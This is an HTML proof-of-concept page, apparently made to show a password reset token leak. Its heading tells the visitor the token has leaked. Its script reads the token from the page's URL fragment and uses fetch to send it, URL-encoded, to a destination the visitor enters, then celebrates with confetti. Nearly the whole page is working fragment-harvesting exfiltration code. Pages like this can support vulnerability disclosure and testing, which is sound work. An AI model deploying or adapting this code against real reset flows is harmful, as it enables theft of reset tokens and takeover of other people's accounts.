<!doctype html>
<html>
  <head>
    <meta charset="utf-8">
    <title>Fragment</title>
    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
    <style>
      .control-panel {
        margin-top: 20px;
        padding: 15px;
        border: 1px solid #ddd;
        background-color: #f9f9f9;
        display: inline-block;
        font-family: sans-serif;
      }
      #status-message {
        margin-top: 10px;
        font-weight: bold;
        color: green;
        display: none; /* Hidden by default */
      }
    </style>
  </head>
  <body>
    <h2>You just leaked your password reset token.</h2>
    <script>
      function sendCustomRequest() {
        var userUrl = document.getElementById("custom-url").value;
        var frag = window.location.hash ? window.location.hash.substring(1) : "";
        var statusEl = document.getElementById("status-message");

        if (!userUrl) {
          alert("Please enter a URL first.");
          return;
        }

        // Check for http/https and prepend https if missing
        if (!userUrl.startsWith("http://") && !userUrl.startsWith("https://")) {
          userUrl = "https://" + userUrl;
        }

        // Ensure the URL ends with a slash
        if (!userUrl.endsWith("/")) {
          userUrl += "/";
        }

        // Send request to user-defined URL with encoded fragment
        fetch(userUrl + encodeURIComponent(frag), {
          method: "GET"
        })
        .then(function() {
          // Success: Show message and Fireworks
          statusEl.style.display = "block";
          statusEl.style.color = "green";
          statusEl.innerText = "Successfully sent";
          
          // Firework 1 (Left)
          confetti({
            particleCount: 100,
            spread: 70,
            origin: { x: 0.1, y: 0.6 }
          });
          // Firework 2 (Right)
          confetti({
            particleCount: 100,
            spread: 70,
            origin: { x: 0.9, y: 0.6 }
          });
        })
        .catch(function(err) {
          console.error("Request failed:", err);
          statusEl.style.display = "block";
          statusEl.style.color = "red";
          statusEl.innerText = "Request failed (Check console/CORS)";
        });
      }
    </script>
     
    <br>
    <h2>If you have a custom URL that you'd like the password reset token to be sent to, enter it below.</h2>

    <div class="control-panel">
        <label for="custom-url"><strong>Custom Destination:</strong></label><br>
        <input type="text" id="custom-url" placeholder="https://example.com/" style="width: 300px; padding: 5px;">
        <button onclick="sendCustomRequest()" style="padding: 5px 10px; cursor: pointer;">Send</button>
        <div id="status-message"></div>
    </div>

  </body>
</html>
